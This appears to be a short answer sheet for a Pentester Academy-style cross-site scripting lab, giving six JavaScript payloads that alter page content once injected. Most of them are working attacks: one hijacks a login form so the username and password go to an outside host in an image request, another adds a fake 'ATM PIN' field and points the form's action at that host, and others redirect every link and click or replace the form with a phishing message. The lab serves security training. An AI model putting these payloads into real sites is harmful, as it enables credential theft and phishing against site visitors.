* Solution 1: Modifying HTML

<script>

document.getElementsByTagName("h2")[2].innerHTML = "Modified You";
document.getElementsByTagName("h1")[0].innerHTML = "Found You";

</script>


* Solution 2: Changing Links

<script>

var links = document.getElementsByTagName("a");

for  (i=0; i < links.length; i++)
{
  links[i].href = "http://PentesterAcademy.com/topics";
  links[i].innerHTML = "Link Modified";
}

</script>


* Solution 3: Hijack Form Submit

<script>

function InterceptForm() 

{
	var username = document.forms[0].elements[0].value;
	var password = document.forms[0].elements[1].value;
	new Image().src = "http://localhost/?username="+username+"&password="+password;
}

document.forms[0].onsubmit = InterceptForm;

</script>


* Solution 4: Modifying Form Fields

<script>

var input = document.createElement("input");

input.setAttribute("type", "text");
input.setAttribute("class", "input-block-level");
input.setAttribute("placeholder", "ATM PIN");
input.setAttribute("name", "atmpin");

var previous = document.forms[0].elements[0];
document.forms[0].insertBefore(input, previous);
document.forms[0].action = "http://localhost/";

</script>


* Solution 5: Social Engineering

<script>

var input = document.createElement("h2");

input.innerHTML = "Website is Down. Please visit SecurityTube.net";

document.forms[0].parentNode.appendChild(input);
document.forms[0].parentNode.removeChild(document.forms[0]);

</script>


* Solution 6: Capture All Clicks

<script>

function CaughtClick () 
{
	location.href = "http://PentesterAcademy.com";

}

document.body.addEventListener('click', CaughtClick, true);

</script>
